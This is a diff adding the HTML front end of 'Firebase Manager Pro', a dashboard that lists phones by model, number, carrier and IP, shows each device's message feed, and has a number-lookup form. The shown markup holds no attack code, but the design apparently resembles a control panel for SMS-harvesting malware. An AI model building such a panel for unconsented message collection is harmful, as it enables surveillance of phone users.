@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#020617">
+    <title>Firebase Manager Pro</title>
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%2306b6d4'/%3E%3Ctext x='16' y='21' font-family='monospace' font-size='13' font-weight='bold' text-anchor='middle' fill='%2302151d'%3EFB%3C/text%3E%3C/svg%3E">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<header class="app-header">
+    <div class="header-row">
+        <div class="brand">
+            <span class="brand-mark" aria-hidden="true">FB</span>
+            <div class="brand-text">
+                <h1>Firebase Manager Pro</h1>
+                <button id="connectionPill" class="connection-pill" type="button" title="Manage databases">
+                    <span class="dot dot-idle" id="connectionDot"></span>
+                    <span id="connectionLabel">not connected</span>
+                </button>
+            </div>
+        </div>
+        <div class="header-actions">
+            <button id="searchBtn" class="icon-btn" type="button" title="Search devices and messages" aria-label="Search">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M10 4a6 6 0 1 0 3.47 10.9l5.3 5.3 1.42-1.42-5.3-5.3A6 6 0 0 0 10 4zm0 2a4 4 0 1 1 0 8 4 4 0 0 1 0-8z"/></svg>
+            </button>
+            <button id="reloadBtn" class="icon-btn" type="button" title="Reload from database" aria-label="Reload">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 5V2L7 6l5 4V7a5 5 0 1 1-5 5H5a7 7 0 1 0 7-7z"/></svg>
+            </button>
+            <button id="dbManagerBtn" class="icon-btn" type="button" title="Databases" aria-label="Databases">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3c-4.42 0-8 1.34-8 3v12c0 1.66 3.58 3 8 3s8-1.34 8-3V6c0-1.66-3.58-3-8-3zm0 2c3.87 0 6 .99 6 1s-2.13 1-6 1-6-.99-6-1 2.13-1 6-1zm6 4.5V12c0 .01-2.13 1-6 1s-6-.99-6-1V9.5C7.4 10.42 9.6 11 12 11s4.6-.58 6-1.5zm0 6V18c0 .01-2.13 1-6 1s-6-.99-6-1v-2.5C7.4 16.42 9.6 17 12 17s4.6-.58 6-1.5z"/></svg>
+            </button>
+        </div>
+    </div>
+</header>
+
+<main class="app-main">
+
+    <!-- ============================ DEVICES ============================ -->
+    <section id="tab-devices" class="tab-panel" aria-labelledby="navDevices">
+        <div class="stats-row">
+            <div class="stat-card">
+                <span class="stat-label">Devices</span>
+                <span class="stat-value" id="statTotal">—</span>
+            </div>
+            <div class="stat-card stat-online">
+                <span class="stat-label">Online</span>
+                <span class="stat-value" id="statOnline">—</span>
+            </div>
+            <div class="stat-card stat-offline">
+                <span class="stat-label">Offline</span>
+                <span class="stat-value" id="statOffline">—</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-label">Showing</span>
+                <span class="stat-value" id="statShowing">—</span>
+            </div>
+        </div>
+
+        <div class="search-row">
+            <input id="deviceFilter" class="input" type="search" placeholder="Filter by ID, model, phone, carrier, IP…" autocomplete="off">
+            <select id="statusFilter" class="input input-compact" aria-label="Filter by status">
+                <option value="all">All</option>
+                <option value="online">Online</option>
+                <option value="offline">Offline</option>
+                <option value="unknown">Unknown</option>
+            </select>
+        </div>
+
+        <div id="layoutNotice" class="notice hidden"></div>
+
+        <div id="deviceGrid" class="device-grid">
+            <div class="placeholder">Connect a database to list its devices.</div>
+        </div>
+    </section>
+
+    <!-- ============================ MESSAGES =========================== -->
+    <section id="tab-messages" class="tab-panel hidden" aria-labelledby="navMessages">
+        <div class="panel-head">
+            <button id="messageBackBtn" class="btn btn-ghost hidden" type="button">← Devices</button>
+            <div class="panel-title-wrap">
+                <span class="panel-title">Message feed</span>
+                <span id="messageSubtitle" class="panel-subtitle">No device selected</span>
+            </div>
+            <div class="panel-actions">
+                <button id="refreshMessagesBtn" class="btn btn-ghost" type="button">Refresh</button>
+            </div>
+        </div>
+
+        <div class="search-row">
+            <input id="messageFilter" class="input" type="search" placeholder="Filter by number or message text…" autocomplete="off">
+        </div>
+
+        <div id="messageList" class="message-list">
+            <div class="placeholder">Pick a device to read its messages.</div>
+        </div>
+    </section>
+
+    <!-- ============================= LOOKUP ============================ -->
+    <section id="tab-lookup" class="tab-panel hidden" aria-labelledby="navLookup">
+        <div class="panel-head">
+            <div class="panel-title-wrap">
+                <span class="panel-title">Mobile lookup</span>
+                <span class="panel-subtitle">Checks a number against the configured endpoint</span>
+            </div>
+        </div>
+
+        <form id="lookupForm" class="card card-form" autocomplete="off">
+            <label class="field">
+                <span class="field-label">Mobile number</span>
+                <input id="lookupMobile" class="input" type="tel" inputmode="numeric" placeholder="9876543210" required>
+            </label>
+            <label class="field">
+                <span class="field-label">Endpoint</span>
+                <input id="lookupEndpoint" class="input" type="url" spellcheck="false" placeholder="https://example.com/api/check-mobile">
+            </label>
+            <label class="field">
+                <span class="field-label">Token (stored in this browser only)</span>
+                <input id="lookupToken" class="input" type="password" spellcheck="false" placeholder="x-token value">
+            </label>
+            <label class="field">
+                <span class="field-label">initData (optional)</span>
+                <input id="lookupInitData" class="input" type="text" spellcheck="false" placeholder="leave empty if unused">
+            </label>
+            <div class="form-actions">
+                <button id="lookupSubmit" class="btn btn-primary" type="submit">Check number</button>
+                <button id="lookupSaveBtn" class="btn btn-ghost" type="button">Save settings</button>
+            </div>
+        </form>
+
+        <div id="lookupStatus" class="notice hidden"></div>
+        <div id="lookupResult" class="card hidden"></div>
+
+        <details class="card card-muted">
+            <summary>Request that will be sent</summary>
+            <pre id="lookupPreview" class="code-block">POST &lt;endpoint&gt;
+x-token: &lt;token&gt;
+{ "mobile": "…", "token": "…", "initData": "" }</pre>
+        </details>
+    </section>
+
+    <!-- =========================== DATABASES =========================== -->
+    <section id="tab-databases" class="tab-panel hidden" aria-labelledby="navDatabases">
+        <div class="panel-head">
+            <div class="panel-title-wrap">
+                <span class="panel-title">Databases</span>
+                <span class="panel-subtitle">Connect to a Realtime Database you own</span>
+            </div>
+        </div>
+
+        <form id="addDbForm" class="card card-form" autocomplete="off">
+            <label class="field">
+                <span class="field-label">Database URL</span>
+                <input id="dbUrlInput" class="input" type="text" spellcheck="false"
+                       placeholder="https://my-project-default-rtdb.firebaseio.com" required>
+            </label>
+            <label class="field">
+                <span class="field-label">Label (optional)</span>
+                <input id="dbLabelInput" class="input" type="text" placeholder="Production fleet">
+            </label>
+            <div class="form-actions">
+                <button id="dbAddBtn" class="btn btn-primary" type="submit">Add &amp; connect</button>
+            </div>
+            <p class="help">
+                A database secret can be appended as <code>?auth=…</code>. It is stored unencrypted in
+                this browser's local storage and sent to that database only. Leave it out when your
+                rules already allow the read.
+            </p>
+        </form>
+
+        <div id="dbFeedback" class="notice hidden"></div>
+
+        <div class="card">
+            <div class="card-head">
+                <span class="section-title">Saved databases</span>
+                <span class="section-hint">tap to connect</span>
+            </div>
+            <div id="dbList" class="db-list">
+                <div class="placeholder">None saved yet.</div>
+            </div>
+        </div>
+
+        <div class="card card-muted">
+            <div class="card-head"><span class="section-title">Detected layout</span></div>
+            <pre id="layoutDetails" class="code-block">Connect a database to inspect its structure.</pre>
+        </div>
+    </section>
+</main>
+
+<!-- ============================ BOTTOM NAV ============================ -->
+<nav class="bottom-nav" aria-label="Sections">
+    <button id="navDevices" class="nav-item nav-active" type="button">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 3h7v7H4V3zm9 0h7v7h-7V3zM4 12h7v9H4v-9zm9 3h7v6h-7v-6z"/></svg>
+        <span>Devices</span>
+    </button>
+    <button id="navMessages" class="nav-item" type="button">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 4h16a1 1 0 0 1 1 1v11a1 1 0 0 1-1 1H8l-5 4V5a1 1 0 0 1 1-1z"/></svg>
+        <span>Messages</span>
+    </button>
+    <button id="navLookup" class="nav-item" type="button">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M6.6 10.8a15.5 15.5 0 0 0 6.6 6.6l2.2-2.2a1 1 0 0 1 1-.25c1.1.36 2.3.56 3.6.56a1 1 0 0 1 1 1V20a1 1 0 0 1-1 1A17 17 0 0 1 3 4a1 1 0 0 1 1-1h3.5a1 1 0 0 1 1 1c0 1.3.2 2.5.56 3.6a1 1 0 0 1-.25 1L6.6 10.8z"/></svg>
+        <span>Lookup</span>
+    </button>
+    <button id="navDatabases" class="nav-item" type="button">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3c-4.42 0-8 1.34-8 3v12c0 1.66 3.58 3 8 3s8-1.34 8-3V6c0-1.66-3.58-3-8-3zm6 6.5V12c0 .01-2.13 1-6 1s-6-.99-6-1V9.5C7.4 10.42 9.6 11 12 11s4.6-.58 6-1.5zm0 6V18c0 .01-2.13 1-6 1s-6-.99-6-1v-2.5C7.4 16.42 9.6 17 12 17s4.6-.58 6-1.5z"/></svg>
+        <span>Data</span>
+    </button>
+</nav>
+
+<!-- ========================= DEVICE DETAIL ========================== -->
+<div id="deviceModal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="deviceModalTitle">
+    <div class="modal-backdrop" data-close="deviceModal"></div>
+    <div class="modal-body">
+        <div class="modal-head">
+            <div>
+                <h2 id="deviceModalTitle">Device</h2>
+                <p id="deviceModalSub" class="panel-subtitle"></p>
+            </div>
+            <button class="icon-btn" type="button" data-close="deviceModal" aria-label="Close">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18.3 5.7 12 12l6.3 6.3-1.4 1.4L10.6 13.4 4.3 19.7 2.9 18.3 9.2 12 2.9 5.7 4.3 4.3l6.3 6.3 6.3-6.3z"/></svg>
+            </button>
+        </div>
+        <div id="deviceModalContent" class="modal-content"></div>
+    </div>
+</div>
+
+<!-- ========================== DB MANAGER ============================ -->
+<div id="dbModal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="dbModalTitle">
+    <div class="modal-backdrop" data-close="dbModal"></div>
+    <div class="modal-body">
+        <div class="modal-head">
+            <div>
+                <h2 id="dbModalTitle">Switch database</h2>
+                <p class="panel-subtitle">Saved in this browser only</p>
+            </div>
+            <button class="icon-btn" type="button" data-close="dbModal" aria-label="Close">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18.3 5.7 12 12l6.3 6.3-1.4 1.4L10.6 13.4 4.3 19.7 2.9 18.3 9.2 12 2.9 5.7 4.3 4.3l6.3 6.3 6.3-6.3z"/></svg>
+            </button>
+        </div>
+        <div id="dbModalList" class="modal-content"></div>
+    </div>
+</div>
+
+<!-- ======================== GLOBAL SEARCH =========================== -->
+<div id="searchModal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+    <div class="modal-backdrop" data-close="searchModal"></div>
+    <div class="modal-body">
+        <div class="modal-head">
+            <h2 id="searchModalTitle" class="sr-only">Search</h2>
+            <input id="globalSearchInput" class="input" type="search" placeholder="Search device ID, phone, model, message text…" autocomplete="off">
+            <button class="icon-btn" type="button" data-close="searchModal" aria-label="Close">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18.3 5.7 12 12l6.3 6.3-1.4 1.4L10.6 13.4 4.3 19.7 2.9 18.3 9.2 12 2.9 5.7 4.3 4.3l6.3 6.3 6.3-6.3z"/></svg>
+            </button>
+        </div>
+        <div id="globalSearchResults" class="modal-content">
+            <div class="placeholder">Type to search the loaded devices and messages.</div>
+        </div>
+    </div>
+</div>
+
+<div id="toasts" class="toasts" aria-live="polite"></div>
+
+<script type="module" src="app.js"></script>
+</body>
+</html>
